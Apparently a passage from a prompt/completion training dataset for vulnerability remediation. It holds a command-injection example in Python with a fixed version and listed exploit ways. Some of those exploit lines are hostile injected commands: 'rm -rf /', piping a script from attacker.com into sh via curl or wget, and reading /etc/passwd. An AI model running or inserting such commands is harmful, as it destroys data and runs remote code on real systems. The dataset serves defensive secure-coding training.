hashlib.sha256(password.encode()).hexdigest()\\\\n    \\\\n    def login(self, username, password):\\\\n        hashed_input_password = self.hash_password(password)\\\\n        return self.username == username and self.password == hashed_input_password\", \"exploit_ways\": [\"An attacker can use the hardcoded credentials 'admin'/'password123' to gain unauthorized access.\", \"By using brute force, an attacker could try common passwords to find the correct login.\", \"If user enumeration is possible, attackers may target known usernames like 'admin'.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Command Injection\n- Vulnerable Code: # Python example\ndef complex_unsafe_function(param):\n    import subprocess\n    command = ['echo', param]\n    subprocess.Popen(command, shell=True)\n- CVSS Score: 8.8\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"# Python example\\\\ndef complex_unsafe_function(param):\\\\n    import subprocess\\\\n    command = ['echo', param]\\\\n    subprocess.Popen(command, shell=True)\", \"vulnerability_type\": \"Command Injection\", \"cvss_score\": 8.8, \"fixed_code\": \"# Python example\\\\ndef complex_safe_function(param):\\\\n    import subprocess\\\\n    command = ['echo', param]\\\\n    subprocess.Popen(command, shell=False)\", \"exploit_ways\": [\"An attacker could inject '; rm -rf /' to delete all files on the system.\", \"Could use '; wget http://attacker.com/malware.sh -O - | sh' to download and execute malicious script.\", \"Chaining commands like '; cat /etc/passwd' can leak sensitive information.\"]}"}
